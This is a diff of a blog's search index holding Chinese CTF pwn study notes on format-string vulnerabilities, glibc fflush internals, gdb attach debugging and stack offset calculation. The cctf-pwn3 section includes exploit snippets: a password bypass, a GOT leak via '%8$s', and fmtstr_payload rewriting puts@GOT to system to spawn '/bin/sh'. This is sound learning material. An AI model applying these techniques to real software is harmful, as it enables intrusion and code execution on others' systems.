@@ -1253,15 +1253,15 @@ fakeBK <span class="token operator">-&gt;</span> fd <span class="token operator"
       </tags>
   </entry>
   <entry>
-    <title>重探fmt</title>
+    <title>格式化字符串漏洞学习</title>
     <url>/2021/10/23/%E6%91%86%E7%83%82%E7%AC%AC%E4%B8%89%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[<html><head></head><body><h2 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h2><p>绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>
 <p>首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>
 <p>所以碰到这道题，算是又给我敲了第nn个警钟。</p>
 <p>非常清晰地告诉我：我是垃圾。</p>
 <h2 id="2）格式化字符串基本原理">2）格式化字符串基本原理<a class="post-anchor" href="#2）格式化字符串基本原理"></a></h2><p>ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>
-<h5 id="格式化字符串参数">格式化字符串参数<a class="post-anchor" href="#格式化字符串参数"></a></h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span><span class="token punctuation">[</span>parameter<span class="token punctuation">]</span><span class="token punctuation">[</span>flags<span class="token punctuation">]</span><span class="token punctuation">[</span>field width<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">.</span>precision<span class="token punctuation">]</span><span class="token punctuation">[</span>length<span class="token punctuation">]</span>type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<h5 id="格式化字符串参数">格式化字符串参数<a class="post-anchor" href="#格式化字符串参数"></a></h5><pre><code class="c">%[parameter][flags][field width][.precision][length]type
+</code></pre>
 <ul>
 <li><p>parameter</p>
 <ul>
@@ -1323,41 +1323,41 @@ fakeBK <span class="token operator">-&gt;</span> fd <span class="token operator"
 <h5 id="fflush函数">fflush函数<a class="post-anchor" href="#fflush函数"></a></h5><p>然后是关于fflush函数的glibc源码。</p>
 <p>fflush实际是调用vtable中的函数<code>_IO_new_file_sync</code>，这个函数的源码如图：</p>
 <p>（<code>/glibc-2.23/libio/fileops.c:867</code>）</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span>
-<span class="token function">_IO_new_file_sync</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  _IO_ssize_t delta<span class="token punctuation">;</span>
-  <span class="token keyword">int</span> retval <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<pre><code class="c">int
+_IO_new_file_sync (_IO_FILE *fp)
+{
+  _IO_ssize_t delta;
+  int retval = 0;
 
-  <span class="token comment">/*    char* ptr = cur_ptr(); */</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">&gt;</span> fp<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">)</span> 
-    <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span><span class="token comment">//end of file</span>
-  delta <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">-</span> fp<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>delta <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">TODO</span></span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_in_backup</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">)</span>
-	delta <span class="token operator">-=</span> <span class="token function">eGptr</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">Gbase</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
-      _IO_off64_t new_pos <span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> delta<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">!=</span> <span class="token punctuation">(</span>_IO_off64_t<span class="token punctuation">)</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
-	fp<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">ESPIPE</span></span>
-      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> ESPIPE<span class="token punctuation">)</span>
-	<span class="token punctuation">;</span> <span class="token comment">/* Ignore error from unseekable devices. */</span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
-      <span class="token keyword">else</span>
-	retval <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>retval <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
-    fp<span class="token operator">-&gt;</span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>
-  <span class="token comment">/* FIXME: Cleanup - can this be shared? */</span>
-  <span class="token comment">/*    setg(base(), ptr, ptr); */</span>
-  <span class="token keyword">return</span> retval<span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_sync<span class="token punctuation">,</span> _IO_file_sync<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+  /*    char* ptr = cur_ptr(); */
+  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+    if (_IO_do_flush(fp)) 
+    return EOF;//end of file
+  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;
+  if (delta != 0)
+    {
+#ifdef TODO
+      if (_IO_in_backup (fp))
+    delta -= eGptr () - Gbase ();
+#endif
+      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);
+      if (new_pos != (_IO_off64_t) EOF)
+    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;
+#ifdef ESPIPE
+      else if (errno == ESPIPE)
+    ; /* Ignore error from unseekable devices. */
+#endif
+      else
+    retval = EOF;
+    }
+  if (retval != EOF)
+    fp-&gt;_offset = _IO_pos_BAD;
+  /* FIXME: Cleanup - can this be shared? */
+  /*    setg(base(), ptr, ptr); */
+  return retval;
+}
+libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)
+</code></pre>
 <p>虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。</p>
 <h5 id="pwntools与缓冲区机制">pwntools与缓冲区机制<a class="post-anchor" href="#pwntools与缓冲区机制"></a></h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>
 <p>为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%94%E5%A4%A9--pwntools%E6%BA%90%20%E7%A0%81%20%E5%89%96%20%E6%9E%90--%E4%BB%A5%E6%BA%90%E7%A0%81%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90io%E4%BA%A4%E4%BA%92%E5%8E%9F%E7%90%86/">pwntools源码剖析（1）–以源码的角度分析io交互原理</a></p>
@@ -1394,18 +1394,17 @@ fakeBK <span class="token operator">-&gt;</span> fd <span class="token operator"
 <p>原因详见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/">摆烂第四天–gdb附加调试的一些黑魔法</a>的2.1节。</p>
 <p>因为一下断点，程序就异常退出，所以这道题又非常不幸地沦为了看，而不是调。</p>
 <p>等问题解决了在再来调。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">tmp <span class="token operator">=</span> <span class="token string">'sysbdmin'</span>
-name <span class="token operator">=</span> <span class="token string">""</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>
-    name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+<pre><code class="python">tmp = 'sysbdmin'
+name = ""
+for i in tmp:
+    name += chr(ord(i) - 1)
 
 
-<span class="token comment">## password</span>
-<span class="token keyword">def</span> <span class="token function">password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name (ftp.hacker.server:Rainism):'</span><span class="token punctuation">)</span>
-    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+## password
+def password():
+    sh.recvuntil('Name (ftp.hacker.server:Rainism):')
+    sh.sendline(name)
+</code></pre>
 <p>绕过密码的关键函数。其实绕过的核心思路就是strcmp的返回值，strcmp是以asc2码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的asc2小，但字符长度相等的字符。</p>
 <p>这样就有了代码中的公式。</p>
 <p>当我们绕过了密码，然后就需要打印puts函数的真实地址。</p>
@@ -1413,27 +1412,25 @@ name <span class="token operator">=</span> <span class="token string">""</span>
 <p>关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。</p>
 <p>原理参见：<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
 <p>这里的偏移是8</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># get the addr of puts</span>
-puts_got <span class="token operator">=</span> pwn3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts got : '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
-put<span class="token punctuation">(</span><span class="token string">b'1111'</span><span class="token punctuation">,</span> <span class="token string">b'%8$s'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
-puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>get<span class="token punctuation">(</span><span class="token string">'1111'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
+<pre><code class="python"># get the addr of puts
+puts_got = pwn3.got['puts']
+log.success('puts got : ' + hex(puts_got))
+put(b'1111', b'%8$s' + p32(puts_got))
+puts_addr = u32(get('1111')[:4])
+</code></pre>
 <p>然后put一个名为1111的文件，内容是格式化字符串以及puts的got表地址。</p>
 <p>这里<code>%8$s' + p32(puts_got)</code>应该是先把puts的got表传进去，然后再通过%8$s打印。</p>
 <p>然后接收信息，就是puts的got表。</p>
 <p>然后就是经典rop的确定libc基址和system地址，比较套路。</p>
 <p>下一个关键点是</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>puts_got<span class="token punctuation">:</span> system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
-put<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'enter the file name you want to get:'</span><span class="token punctuation">)</span>
-<span class="token comment">##gdb.attach(sh)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
+<pre><code class="python">payload = fmtstr_payload(7, {puts_got: system_addr})
+put('/bin/sh;', payload)
+sh.recvuntil('ftp&gt;')
+sh.sendline('get')
+sh.recvuntil('enter the file name you want to get:')
+##gdb.attach(sh)
+sh.sendline('/bin/sh;') 
+</code></pre>
 <p>​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>
 <p>​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>
 <p>​    关于函数是如何实现的，可以参见另外一篇笔记。<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理</a></p>
@@ -1459,55 +1456,52 @@ sh<span class="token punctuation">.</span>sendline<span class="token punctuation
     <title>gdb附加调试的一些黑魔法</title>
     <url>/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/</url>
     <content><![CDATA[<html><head></head><body><h2 id="1）abstract">1）abstract<a class="post-anchor" href="#1）abstract"></a></h2><p>​    这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。</p>
-<h2 id="2）格式化字符串-cctf-pwn3">2）格式化字符串-cctf-pwn3<a class="post-anchor" href="#2）格式化字符串-cctf-pwn3"></a></h2><h3 id="1）pause（p）导致ERROR-Could-not-find-ELF-base">1）pause（p）导致ERROR: Could not find ELF base<a class="post-anchor" href="#1）pause（p）导致ERROR-Could-not-find-ELF-base"></a></h3><p>​    在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process <span class="token number">27837</span>
-Reading symbols from /lib/i386-linux-gnu/libc.so.6<span class="token punctuation">..</span>.Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so<span class="token punctuation">..</span>.done.
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
+<h2 id="2）格式化字符串-cctf-pwn3">2）格式化字符串-cctf-pwn3<a class="post-anchor" href="#2）格式化字符串-cctf-pwn3"></a></h2><h3 id="1）pause（p）导致ERROR-Could-not-find-ELF-base">1）pause（p）导致ERROR: Could not find ELF base<a class="post-anchor" href="#1）pause（p）导致ERROR-Could-not-find-ELF-base"></a></h3><h5 id="问题">问题<a class="post-anchor" href="#问题"></a></h5><p>​    在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样：</p>
+<pre><code class="bash">Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837
+Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.
+ERROR: Could not find ELF base!
 done.
-Reading symbols from /lib/ld-linux.so.2<span class="token punctuation">..</span>.Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so<span class="token punctuation">..</span>.done.
+Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done.
 done.
 Cannot access memory at address 0xf7fad924
 
-warning: Unable to <span class="token function">find</span> dynamic linker breakpoint function.
+warning: Unable to find dynamic linker breakpoint function.
 GDB will be unable to debug shared library initializers
 and track explicitly loaded dynamic code.
-Failed to <span class="token builtin class-name">read</span> a valid object <span class="token function">file</span> image from memory.
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-0xf7f85b59 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
-ERROR: Could not <span class="token function">find</span> ELF base<span class="token operator">!</span>
+Failed to read a valid object file image from memory.
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+0xf7f85b59 in ?? ()
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
 
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
+</code></pre>
 <p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png" data-caption="截屏2021-10-27 上午11.17.59" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png" alt="截屏2021-10-27 上午11.17.59"></a></p>
-<p>首先需要知道这个报错的原因。</p>
-<p>虽然我并没有查到<code>ERROR: Could not find ELF base!</code>这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。</p>
-<p>那么进程中止的原因何在？</p>
-<p>如果只是输入gdb.attach()，那么程序会断在<code>__kernel_vsyscall</code>这个函数上，原因我们稍后讨论。</p>
-<p>所以现在讨论的其实是gdb.attach(）与gdb.attach(sh)的差别。</p>
-<p>gdb.attach(sh)这一用法，理论上是没有问题的，我看网上很多人都是这么做并且没有报错，但我要做的是搞清楚，gdb.attach(sh)对我的系统做了什么，导致进程意外退出。</p>
-<h3 id="3）-kernel-vsyscall？">3）__kernel_vsyscall？<a class="post-anchor" href="#3）-kernel-vsyscall？"></a></h3><p>​    上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在<code>__kernel_vsyscall</code>这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。</p>
+<p>​    首先需要知道这个报错的原因。</p>
+<p>​    虽然我并没有查到<code>ERROR: Could not find ELF base!</code>这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。</p>
+<p>​    那么进程中止的原因何在？</p>
+<h5 id="解决方案">解决方案<a class="post-anchor" href="#解决方案"></a></h5><p>​     经过大师指点，这个问题其实是因为exp错误（</p>
+<p>​    这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是<code>elf base not found</code>。    </p>
+<h5 id="总结">总结<a class="post-anchor" href="#总结"></a></h5><p>​    如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。</p>
+<h3 id="3）-kernel-vsyscall？">3）__kernel_vsyscall？<a class="post-anchor" href="#3）-kernel-vsyscall？"></a></h3><h5 id="问题-1">问题<a class="post-anchor" href="#问题-1"></a></h5><p>​    上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在<code>__kernel_vsyscall</code>这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。</p>
 <p>​    我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么<code>__kernel_vsyscall</code>是一个怎样的函数，为什么偏偏就断在它的身上呢？ </p>
-<p>​    在stackoverflow上，我们能够看出一些端倪。</p>
+<h5 id="解决">解决<a class="post-anchor" href="#解决"></a></h5><p>​    在stackoverflow上，我们能够看出一些端倪。</p>
 <blockquote>
 <p>​    <code>__kernel_vsyscal</code> is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the <code>sysenter</code> instruction. </p>
 </blockquote>
-<p>这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。</p>
-<p>所以出现   <code>__kernel_vsyscal</code> 意味着此刻程序正在进行系统调用。</p>
-<p>关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见：</p>
+<p>​    这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。</p>
+<p>​    所以出现   <code>__kernel_vsyscal</code> 意味着此刻程序正在进行系统调用。我们同时可以注意到，当  <code>__kernel_vsyscal</code> 函数执行完成，下一个函数则是<code>read</code>函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。</p>
 <p>当然要结束这个函数我们只需要gdb finish。</p>
 <p>或者直接使用gdb.attach(sh,”break xxx”)。</p>
-<p>​    </p>
+<p>关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见：</p>
+<h3 id="4）gdb附加调试下断点的几种姿势。">4）gdb附加调试下断点的几种姿势。<a class="post-anchor" href="#4）gdb附加调试下断点的几种姿势。"></a></h3><h5 id="1）gdb-attach-p">1）gdb.attach(p)<a class="post-anchor" href="#1）gdb-attach-p"></a></h5><h5 id="2）gdb-attach-p-”break-lt-func-name-gt-”">2）gdb.attach(p,”break &lt;func name&gt;”)<a class="post-anchor" href="#2）gdb-attach-p-”break-lt-func-name-gt-”"></a></h5><h5 id="3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”">3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )<a class="post-anchor" href="#3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”"></a></h5><p>​    </p>
 <p>​    </p>
 <p>​    </p>
 <h2 id="）参考">）参考<a class="post-anchor" href="#）参考"></a></h2><p><a href="https://blog.csdn.net/fjh1997/article/details/105434992">如何做到一边使用pwntools一边使用gdb下断点到main函数前</a></p>
@@ -1761,7 +1755,35 @@ show<span class="token punctuation">(</span><span class="token number">0</span><
     <content><![CDATA[<html><head></head><body><p>重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现</p>
 <h3 id="1）32位偏移计算原理">1）32位偏移计算原理<a class="post-anchor" href="#1）32位偏移计算原理"></a></h3><p>​    其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。</p>
 <p>​    准确来说应该是格式化字符串在栈上的偏移。</p>
-<h3 id="2）64位偏移计算原理">2）64位偏移计算原理<a class="post-anchor" href="#2）64位偏移计算原理"></a></h3><h3 id="3）-pwntools-fmtstr工具">3） pwntools_fmtstr工具<a class="post-anchor" href="#3）-pwntools-fmtstr工具"></a></h3><h3 id="）参考">）参考<a class="post-anchor" href="#）参考"></a></h3><p>​    <a href="https://blog.csdn.net/weixin_43092232/article/details/105647076">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>
+<p>​    原理也比较简单。x86架构下，格式化字符串时通过栈传递的。</p>
+<p>​    然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。</p>
+<p>​    举一个例子，源码来源于<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">3.1.1 格式化字符串漏洞</a></p>
+<pre><code class="c">//test1.c
+#include&lt;stdio.h&gt;
+void main() {
+    printf("%s %d %s", "Hello World!", 233, "\n");
+}
+</code></pre>
+<p>​    这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。</p>
+<p>​    我们以32位编译。</p>
+<pre><code class="bash">gcc -m32 test1.c -o test1
+</code></pre>
+<p>​    在main函数处下一个断点。然后执行到断点处。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png" data-caption="截屏2021-10-28 下午11.35.36" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png" alt="截屏2021-10-28 下午11.35.36"></a></p>
+<p>​    随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从<code>stack</code></p>
+<p>部分我们可以看到，此时栈里已经有一个参数”\n”。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png" data-caption="截屏2021-10-28 下午11.38.15" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png" alt="截屏2021-10-28 下午11.38.15"></a>    </p>
+<p>​    继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png" data-caption="截屏2021-10-28 下午11.40.00" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png" alt="截屏2021-10-28 下午11.40.00"></a></p>
+<p>​    可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子：</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png" data-caption="截屏2021-10-28 下午11.41.43" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png" alt="截屏2021-10-28 下午11.41.43"></a></p>
+<p>​    </p>
+<p>​    然后回忆一下被调函数参数和局部变量压栈的过程：</p>
+<p>​    主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。</p>
